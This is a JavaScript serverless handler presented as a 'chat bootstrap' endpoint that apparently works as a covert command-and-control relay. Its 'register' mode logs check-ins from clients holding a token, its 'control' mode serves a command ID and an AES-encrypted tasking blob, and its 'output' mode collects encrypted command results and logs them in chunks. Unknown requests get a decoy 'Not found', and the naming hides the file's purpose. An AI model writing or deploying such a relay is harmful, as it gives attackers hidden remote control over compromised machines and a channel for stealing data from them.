import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '41';
const CONTROL_PAYLOAD = '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';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}
function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}
export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');
  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }
  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }
  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    const splitAt = body.indexOf(':');
    const commandId = splitAt >= 0 ? body.slice(0, splitAt) : 'unknown';
    const cipher = splitAt >= 0 ? body.slice(splitAt + 1) : body;
    const chunkSize = 1800;
    const total = Math.max(1, Math.ceil(cipher.length / chunkSize));
    for (let i = 0; i < total; i += 1) console.log(`CHAT_BOOTSTRAP_OUTPUT_PART ${commandId} ${i + 1}/${total} ${cipher.slice(i * chunkSize, (i + 1) * chunkSize)}`);
    return response.status(204).end();
  }
  return response.status(404).send('Not found');
}
